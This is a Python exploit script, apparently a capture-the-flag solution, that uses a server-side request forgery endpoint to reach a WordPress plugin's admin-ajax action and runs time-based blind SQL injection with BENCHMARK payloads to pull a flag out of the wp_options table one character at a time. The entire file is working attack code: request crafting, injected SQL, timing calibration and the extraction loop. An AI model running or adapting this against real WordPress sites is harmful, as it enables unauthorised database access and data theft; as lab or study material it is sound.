#!/usr/bin/env python3
import requests
import time
import urllib.parse
import sys

BASE = "http://IP-TARGET:PORT/"
TARGETS = [
    "http://127.0.0.1/cms/wp-admin/admin-ajax.php",
    "http://localhost/cms/wp-admin/admin-ajax.php",
    "http://[::1]/cms/wp-admin/admin-ajax.php",
]
ACTION = "w2dc_get_map_marker_info"
BENCH_ITERS = 1_000_000      
CALIB_TRIES = 2
PRED_TRIALS = 1
ASCII_MIN, ASCII_MAX = 32, 126
RETRY_LIMIT = 5              
SLEEP_BETWEEN_REQ = 0.5      

sess = requests.Session()
sess.headers.update({"User-Agent": "Mozilla/5.0 (42) ctf-ssrf-benchmark/1.0"})
sess.auth = ('ctf', 'PhrasesFromTheHitchhikersGuideToTheGalaxy')

def ssrf_post(internal_url, body_pairs):
    body_pairs = list(body_pairs)
    body_pairs.append(("action", ACTION))
    body = urllib.parse.urlencode(body_pairs, doseq=True)
    params = {"u": f"{internal_url}?action={ACTION}", "b": body}

    for attempt in range(RETRY_LIMIT):
        try:
            t0 = time.perf_counter()
            r = sess.get(BASE, params=params, timeout=15)
            return time.perf_counter() - t0
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed ({e}), retry {attempt+1}/{RETRY_LIMIT}")
            time.sleep(2)
    raise SystemExit("[-] Too many connection failures, aborting.")

def measure(tgt, loc_val, tries=1):
    total = 0
    for _ in range(tries):
        total += ssrf_post(tgt, [("map_id","1"), ("locations_ids[]", loc_val)])
        time.sleep(SLEEP_BETWEEN_REQ)
    return total / tries

def find_target_and_threshold():
    for t in TARGETS:
        print(f"Testing target: {t}")
        base = measure(t, "0", CALIB_TRIES)
        slow = measure(t, f"(SELECT BENCHMARK({BENCH_ITERS},MD5(1)))", CALIB_TRIES)
        print(f"  Baseline: {base:.3f}s, Benchmark: {slow:.3f}s")
        if slow > base + 0.8:
            threshold = (base + slow) / 2.0
            print(f"  Threshold: {threshold:.3f}s")
            return t, threshold
    raise SystemExit("Increase BENCH_ITERS; delta too small.")

def test_predicate(t, thr, cond_sql):
    payload = f"(SELECT IF(({cond_sql}), BENCHMARK({BENCH_ITERS},MD5(1)), 0))"
    votes = 0
    for _ in range(PRED_TRIALS):
        votes += (measure(t, payload, 1) > thr)
    return votes > PRED_TRIALS//2

def leak_flag(max_len=200):
    t, thr = find_target_and_threshold()
    flag = ""

    for pos in range(1, max_len+1):
        lo, hi = ASCII_MIN, ASCII_MAX
        while lo < hi:
            mid = (lo + hi + 1)//2
            cond = ("ASCII(SUBSTRING((SELECT option_value FROM wp_options "
                   "WHERE option_name=CHAR(99,116,102,95,102,108,97,103))"
                   f",{pos},1))>={mid}")
            if test_predicate(t, thr, cond):
                lo = mid
            else:
                hi = mid - 1
        ch = chr(lo)
        flag += ch
        print(f"[+] pos {pos}: {ch!r} -> {flag}")
        if ch == "}":
            break
    print("\n[âœ“] FLAG:", flag)

if __name__ == "__main__":
    leak_flag()